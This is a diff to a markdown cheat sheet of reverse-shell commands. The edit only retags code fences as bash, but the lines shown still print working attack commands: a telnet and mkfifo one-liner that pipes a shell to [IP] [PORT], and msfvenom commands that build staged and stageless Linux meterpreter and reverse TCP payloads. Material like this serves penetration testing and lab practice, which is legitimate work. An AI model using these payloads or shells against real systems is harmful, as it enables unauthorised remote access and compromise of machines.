@@ -35,7 +35,7 @@ sbd -k secret [IP] [PORT]
 
 ## telnet
 ##### Shell
-```
+```bash
 rm -f /tmp/f; mkfifo /tmp/f
 telnet [IP] [PORT] 0</tmp/f | sh >/tmp/f 2>&1
 ```
@@ -79,15 +79,15 @@ python -c "import pty;pty.spawn('/bin/bash')"
 
 ## Metasploit
 ##### Staged reverse TCP
-```sh
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o [NAME].elf
 ```
-```sh
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > [NAME].elf
 ```
 
 ##### Stageless reverse TCP
-```sh
+```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o [NAME].elf
 ```
 
